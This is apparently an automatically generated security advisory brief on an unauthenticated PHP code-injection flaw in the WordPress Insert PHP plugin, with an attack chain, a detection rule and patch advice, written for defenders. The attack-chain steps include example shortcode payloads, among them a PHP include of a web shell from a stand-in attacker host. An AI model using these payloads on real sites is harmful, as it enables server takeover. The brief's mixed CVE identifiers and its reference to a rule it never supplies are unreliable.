---
brief_id: brief-2026-06-wordpress-insert-php-rce
event_id: brief-2026-06-wordpress-insert-php-rce
revision: 1
activity_at: "2026-06-14T21:00:47Z"
title: WordPress Insert PHP Plugin RCE (CVE-2017-20251)
slug: 2026-06-wordpress-insert-php-rce
description: An unauthenticated remote code execution vulnerability (CVE-2024-XXXX, CVE-2017-20251) in WordPress Insert PHP plugin versions before 3.3.1 allows attackers to execute arbitrary PHP code by injecting malicious shortcodes via the WordPress REST API endpoint /wp-json/wp/v2/posts.
date: "2026-06-14T21:00:47Z"
lastmod: "2026-10-30T05:31:25Z"
type: advisory
claim_state: <nil>
types:
  - advisory
severities:
  - critical
exploitation_evidence:
  status: unknown
cpes:
  - cpe:2.3:a:wpkodes:insert_php_plugin_3_3_1:*:*:*:*:*:*:*:*
has_poc: true
poc_references:
  - https://sploitus.com/exploit?id=KITPLOIT:TOOLS-GITHUB-POLOSSS-BY-POLOSS..-..CVE-2017-20251&utm_source=rss&utm_medium=rss
tags:
  - web-application
  - wordpress
  - php
  - rce
  - code-injection
vendors:
  - WPKodes
products:
  - Insert PHP plugin < 3.3.1 (< 3.3.1)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    subtechnique_id: T1059.006
    subtechnique_name: Python
cves:
  - id: CVE-2017-20251
    cvss: 9.8
    epss: 0.00559
    kev_status: "false"
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-20251
  - https://fr.wordpress.org/plugins/insert-php/
  - https://www.exploit-db.com/exploits/41308
  - https://www.vulncheck.com/advisories/wordpress-insert-php-plugin-php-code-injection-via-rest-api
  - https://sploitus.com/exploit?id=KITPLOIT:TOOLS-GITHUB-POLOSSS-BY-POLOSS..-..CVE-2017-20251&utm_source=rss&utm_medium=rss
rules:
  - title: Detect Web Server Spawning Suspicious Processes
    description: Detects a web server process (e.g., Apache, Nginx, PHP-FPM) spawning unusual child processes often indicative of remote code execution (RCE) via vulnerabilities like CVE-2017-20251.
    platform: sigma
    severity: high
    tactics:
      - execution
      - persistence
      - privilege_escalation
    techniques:
      - T1059.004
      - T1059.006
    data_sources:
      - process_creation
      - linux
rules_count: 1
updates:
  - at: "2026-10-30T05:31:25Z"
    level: L2
    summary: poc_available; insert php plugin < 3.3.1 version < 3.3.1
    sources:
      - sploitus
    source_urls:
      - https://sploitus.com/exploit?id=KITPLOIT:TOOLS-GITHUB-POLOSSS-BY-POLOSS..-..CVE-2017-20251&utm_source=rss&utm_medium=rss
---

CVE-2017-20251 is a critical PHP code injection vulnerability affecting WordPress sites running the Insert PHP plugin prior to version 3.3.1. This flaw allows unauthenticated attackers to achieve remote code execution (RCE) by sending specially crafted HTTP POST requests to the WordPress REST API endpoint `/wp-json/wp/v2/posts`. The malicious requests contain `insert_php` shortcodes embedded within the post content, which, when processed by the vulnerable plugin, execute arbitrary PHP code. This enables attackers to include and execute remote PHP files on the server, potentially leading to full system compromise. The vulnerability has a CVSS v3.1 Base Score of 9.8 (Critical) and an exploit has been publicly disclosed.

## Attack Chain

1.  **Reconnaissance**: An unauthenticated attacker identifies a WordPress instance running the vulnerable Insert PHP plugin (versions prior to 3.3.1).
2.  **Vulnerability Exploitation**: The attacker crafts a malicious HTTP POST request to exploit the PHP code injection vulnerability.
3.  **Targeting REST API**: The crafted request is directed at the WordPress REST API endpoint, specifically `/wp-json/wp/v2/posts`, which is used for creating or updating posts.
4.  **Shortcode Injection**: The POST request's body (representing the post content) includes a malicious `[insert_php]` shortcode containing arbitrary PHP code (e.g., `<?php system('command'); ?>` or `<?php include 'http://attacker.com/webshell.php'; ?>`).
5.  **Code Execution**: The vulnerable Insert PHP plugin processes the `[insert_php]` shortcode within the post content without proper sanitization or authentication checks, leading to the execution of the embedded PHP code.
6.  **Remote Code Execution (RCE)**: The executed PHP code allows the attacker to run arbitrary operating system commands, include remote files, or deploy a web shell for persistent access.
7.  **Impact**: The attacker gains full control over the compromised WordPress server, enabling data exfiltration, website defacement, or further lateral movement within the network.

## Impact

Successful exploitation of CVE-2017-20251 grants unauthenticated remote code execution on the affected WordPress server. This allows attackers to perform a wide range of malicious activities, including installing backdoors, stealing sensitive data (e.g., database credentials, user information), defacing the website, using the server for further attacks, or establishing a persistent presence. The high CVSS score of 9.8 reflects the critical nature of this vulnerability, making it a severe threat to any organization running the vulnerable plugin. While specific victim counts are not available, public exploits increase the likelihood of widespread targeting.

## Recommendation

*   Update the "Insert PHP" plugin to version 3.3.1 or higher immediately to remediate CVE-2017-20251.
*   Deploy the Sigma rules provided in this brief to your SIEM for detection of exploitation attempts and post-exploitation activity.
*   Monitor web server access logs for unusual POST requests targeting the `/wp-json/wp/v2/posts` endpoint, especially those containing shortcode-like patterns, as indicated in the `Detects CVE-2017-20251 Exploitation — WordPress Insert PHP Shortcode Injection` rule.
*   Enable process creation logging (e.g., Sysmon on Windows, Auditd on Linux) on web servers to detect suspicious child processes spawned by the web server or PHP interpreter, as indicated in the `Detect Web Server Spawning Suspicious Processes` rule.
